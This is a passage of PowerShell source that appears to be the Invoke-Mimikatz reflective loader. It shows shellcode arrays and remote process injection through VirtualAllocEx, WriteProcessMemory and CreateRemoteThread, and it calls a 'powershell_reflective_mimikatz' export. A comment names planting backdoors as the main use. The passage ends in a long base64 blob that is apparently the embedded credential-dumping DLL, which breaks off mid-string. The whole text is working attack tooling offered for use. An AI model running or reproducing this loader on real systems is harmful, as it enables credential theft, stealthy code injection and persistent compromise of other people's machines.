			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"

        try
        {
            $Processors = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($Processors -is [array])
        {
            $Processor = $Processors[0]
        } else {
            $Processor = $Processors
        }

        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $Processor.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }

        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
                    Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
				    if ($OutputPtr -eq [IntPtr]::Zero)
				    {
				    	Throw "Unable to get output, Output Ptr is NULL"
				    }
				    else
				    {
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				        Write-Output $Output
				        $Win32Functions.LocalFree.Invoke($OutputPtr);
				    }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
    $ExeArgs = " $($Command)"

    [System.IO.Directory]::SetCurrentDirectory($pwd)

    $PEBytes64 = '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